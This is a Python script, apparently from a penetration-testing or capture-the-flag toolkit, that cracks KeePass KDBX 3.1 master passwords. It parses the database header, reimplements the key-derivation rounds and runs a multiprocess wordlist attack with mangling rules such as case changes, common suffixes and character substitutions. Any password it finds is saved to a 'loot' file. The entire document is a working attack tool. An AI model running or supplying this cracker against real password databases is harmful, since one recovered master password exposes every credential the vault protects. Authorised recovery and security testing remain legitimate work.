#!/usr/bin/env python3
"""Fast parallel KDBX 3.1 cracker.

Linux fork() shares the loaded wordlist copy-on-write, so workers only receive
(start,end) integer ranges -> no pickling overhead. The AES-ECB transform cipher
has a constant key (= TransformSeed), so it is created once per worker.
"""
import hashlib, struct, sys, os, time
import multiprocessing as mp
from Cryptodome.Cipher import AES

KDBX = sys.argv[1]
WORDLIST = sys.argv[2]
RULES = "--rules" in sys.argv
MAXLEN = 0
for a in sys.argv:
    if a.startswith("--maxlen="):
        MAXLEN = int(a.split("=")[1])

FIELD = {0: "EndOfHeader", 1: "Comment", 2: "CipherID", 3: "CompressionFlags",
         4: "MasterSeed", 5: "TransformSeed", 6: "TransformRounds", 7: "EncryptionIV",
         8: "ProtectedStreamKey", 9: "StreamStartBytes", 10: "InnerRandomStreamID"}


def parse_header(data):
    assert struct.unpack("<II", data[:8]) == (0x9AA2D903, 0xB54BFB67)
    off, hdr = 12, {}
    while True:
        t, n = struct.unpack("<BH", data[off:off + 3]); off += 3
        hdr[FIELD.get(t, t)] = data[off:off + n]; off += n
        if t == 0:
            break
    return hdr, data[off:]


H, PAY = parse_header(open(KDBX, "rb").read())
SEED, TSEED, IV, START0 = H["MasterSeed"], H["TransformSeed"], H["EncryptionIV"], H["StreamStartBytes"][:16]
ROUNDS = struct.unpack("<Q", H["TransformRounds"])[0]

WORDS = []          # filled before fork; shared COW
CTX = {}            # per-worker reusable transform cipher


def variants(w):
    yield w
    if not RULES:
        return
    for v in (w.lower(), w.upper(), w.capitalize(), w.title()):
        yield v
    for suf in ("1", "12", "123", "1234", "12345", "123456", "!", "1!", "01", "@123", "#1"):
        yield w + suf
        yield w.capitalize() + suf
        yield w.lower() + suf
    yield w[::-1]
    yield w.replace("a", "@")
    yield w.replace("o", "0")
    yield w + w


def check(pw):
    comp = hashlib.sha256(hashlib.sha256(pw.encode()).digest()).digest()
    c = CTX.get("t")
    if c is None:
        c = CTX["t"] = AES.new(TSEED, AES.MODE_ECB)
    for _ in range(max(ROUNDS, 1)):
        comp = c.encrypt(comp)
    mk = hashlib.sha256(SEED + comp).digest()
    return AES.new(mk, AES.MODE_CBC, IV).decrypt(PAY[:16]) == START0


def worker(rng):
    for i in range(rng[0], rng[1]):
        w = WORDS[i]
        if MAXLEN and len(w) > MAXLEN:
            continue
        for v in variants(w):
            if check(v):
                return v
    return None


def main():
    global WORDS
    WORDS = [l.rstrip("\r\n") for l in open(WORDLIST, encoding="utf-8", errors="ignore")]
    nproc = os.cpu_count() or 4
    step = max(5000, len(WORDS) // (nproc * 20))
    ranges = [(i, min(i + step, len(WORDS))) for i in range(0, len(WORDS), step)]
    print("words=%d procs=%d rules=%s rounds=%d" % (len(WORDS), nproc, RULES, ROUNDS), flush=True)
    t0 = time.time()
    ctx = mp.get_context('fork')
    pool = ctx.Pool(nproc)
    try:
        for res in pool.imap_unordered(worker, ranges):   # ranges are small int tuples
            if res:
                pool.terminate(); pool.join()
                print("FOUND:%s" % res, flush=True)
                open("loot/kdbx_master_password.txt", "w").write(res + "\n")
                return 0
    finally:
        try:
            pool.close(); pool.join()
        except Exception:
            pass
    dt = time.time() - t0
    print("not found (%.1fs, %.0f words/s)" % (dt, len(WORDS) / dt))
    return 1


if __name__ == "__main__":
    sys.exit(main())
